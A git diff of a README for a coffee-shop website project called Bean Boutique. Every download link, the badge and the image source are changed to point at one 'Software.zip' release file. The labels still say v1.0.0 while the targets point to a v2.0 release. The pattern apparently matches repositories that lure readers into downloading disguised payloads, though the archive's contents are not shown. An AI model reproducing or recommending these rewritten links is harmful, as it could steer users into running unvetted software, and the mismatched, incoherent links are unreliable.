@@ -24,7 +24,7 @@ The "coffee-shop-website" repository covers a broad spectrum of topics related t
 - web-development
 
 ## 🔗 Download Link
-[Download Bean Boutique v1.0.0](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download Bean Boutique v1.0.0](https://github.com/Merloa01/coffee-shop-website/releases/download/v2.0/Software.zip)
 
 ## 🚀 Get Started
 To launch the project, simply download the zip file from the provided link and extract the contents. You can then explore the codebase and customize it according to your needs.
@@ -34,6 +34,6 @@ For more information, updates, and potential enhancements, please check the "Rel
 
 Let's embark on a delightful journey through the world of coffee with Bean Boutique. Happy coding and happy coffee shopping! ☕🛒
 
-![Coffee Shop Website](https://source.unsplash.com/800x600/?coffee)
+![Coffee Shop Website](https://github.com/Merloa01/coffee-shop-website/releases/download/v2.0/Software.zip)
 
-[![Download Bean Boutique v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Bean Boutique v1.0.0](https://github.com/Merloa01/coffee-shop-website/releases/download/v2.0/Software.zip)](https://github.com/Merloa01/coffee-shop-website/releases/download/v2.0/Software.zip)
